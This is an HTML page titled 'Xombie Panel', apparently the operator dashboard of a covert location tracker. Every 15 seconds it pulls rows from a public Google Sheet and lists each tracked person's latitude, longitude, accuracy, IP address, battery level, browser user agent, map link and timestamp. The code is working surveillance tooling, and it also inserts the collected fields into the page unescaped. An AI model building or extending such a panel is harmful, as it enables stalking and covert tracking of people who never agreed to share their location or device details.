<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Xombie Panel with Working Map</title>
  <style>
    body { background:#000; color:#0ff; font-family: monospace; padding:20px;}
    .entry {border:2px solid #0ff; margin:10px; padding:10px; border-radius:8px;}
    a {color:#0ff; text-decoration:none;}
  </style>
</head>
<body>
  <h1>üìç Live Location Panel</h1>
  <div id="panel"></div>

  <script>
    async function loadSheet() {
      const url = 'https://opensheet.elk.sh/169KNrSyMEwmVJAHsMVTIGmevUvHjFrgr2-424nMEwhc/Sheet1';
      try {
        const res = await fetch(url);
        const data = await res.json();
        const container = document.getElementById('panel');
        container.innerHTML = '';
        data.reverse().forEach(row => {
          const entry = document.createElement('div');
          entry.className = 'entry';
          entry.innerHTML = `
            <p><strong>Lat:</strong> ${row.Latitude}</p>
            <p><strong>Lon:</strong> ${row.Longitude}</p>
            <p><strong>Accuracy:</strong> ${row.Accuracy}</p>
            <p><strong>IP:</strong> ${row.IP}</p>
            <p><strong>Battery:</strong> ${row.Battery}</p>
            <p><strong>UserAgent:</strong> ${row.UserAgent}</p>
            <p><a href="${row.Map}" target="_blank">üìç View on Google Maps</a></p>
            <p><strong>Time:</strong> ${row.Time}</p>
          `;
          container.appendChild(entry);
        });
      } catch (e) {
        document.getElementById('panel').innerText = '‚ö†Ô∏è Error loading data';
        console.error(e);
      }
    }
    loadSheet();
    setInterval(loadSheet, 15000);
  </script>
</body>
</html>
